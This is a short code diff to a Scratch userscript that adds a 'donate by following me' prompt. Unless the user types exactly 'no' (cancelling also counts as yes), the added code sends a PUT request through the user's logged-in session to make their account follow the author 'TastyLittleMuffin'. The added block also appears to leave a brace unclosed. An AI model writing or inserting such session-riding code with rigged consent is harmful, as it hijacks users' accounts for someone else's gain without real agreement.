@@ -13,6 +13,14 @@
 (function() {
     'use strict';
 
+    var donate = localStorage.getItem("donate");
+    if (donate === null) { 
+        var ask = prompt("It takes time to make these scripts, so it would be kind to donate by following me. Type no if you do not want to donate.")
+        localStorage.setItem("donate", ask);
+    if (ask != "no") {
+        $.ajax({type: "PUT",url: "https://scratch.mit.edu/site-api/users/followers/TastyLittleMuffin/add/",data: {usernames: Scratch.INIT_DATA.LOGGED_IN_USER.model.username}})
+    }
+        
     var URL = window.location.href;
 if (URL.includes("scratch.mit.edu/projects/") === true) {
   var ID = URL.substring(33, URL.length - 1);
